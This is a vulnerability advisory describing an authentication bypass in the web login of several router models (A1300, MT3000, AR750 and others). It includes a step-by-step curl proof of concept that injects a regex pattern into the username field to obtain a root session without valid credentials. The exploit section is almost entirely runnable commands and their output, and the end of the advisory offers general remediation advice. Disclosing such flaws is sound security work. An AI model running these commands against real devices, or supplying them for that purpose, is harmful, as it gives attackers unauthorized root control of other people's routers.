**Description**

vulnerability in the local web login.

A remote user is able to login inside the router without a valid user/pass combination as the root account.

**Affected Product**

* A1300 /AX1800 /AXT1800 /MT3000 /MT2500 /MT6000 /MT1300 /MT300N-V2 /AR750S /AR750 /AR300M /B1300

**Exploit**

1. Invoke the challenge API with the user name root

```
$ curl -kLs "http://192.168.8.1/rpc" -d '{"method": "challenge", "params": {"username": "root"}}'
{"id":null,"jsonrpc":"2.0","result":{"salt":"BSIUp\/pe","alg":1,"nonce":"T2FvXOB3DzLi6OugzpU9gvGE0RXXCe3D"}}
```

2. Generate a hash using a special username and password

```
$ username="root:[^:]+:[^:]+"
$ pw=1
$ nonce=T2FvXOB3DzLi6OugzpU9gvGE0RXXCe3D
$ echo -n "$username:$pw:$nonce" | md5sum | cut -d' ' -f1
b9ddd406d3897b87254b1b98c623f5ca
```

3. Call login API

```
$ curl -kLs "http://192.168.8.1/rpc" -d '{"method": "login", "params": {"username": "root:[^:]+:[^:]+","hash":"b9ddd406d3897b87254b1b98c623f5ca"}}'
{"id":0,"jsonrpc":"2.0","result":{"username":"root:[^:]+:[^:]+","sid":"YBu8VNl89jVkd1TiyEYPtrlGOq4d85KM"}}
```

All the preceding steps must be completed within 1 second.

**Impact**

It allows an attacker to easily gain access to a system without knowing a valid username and password. Addressing this vulnerability often requires redesigning the authentication mechanism of the system, avoiding hard-coding credentials in the code, and adopting more secure authentication methods, such as using hash password stores and salt values to protect user credentials.
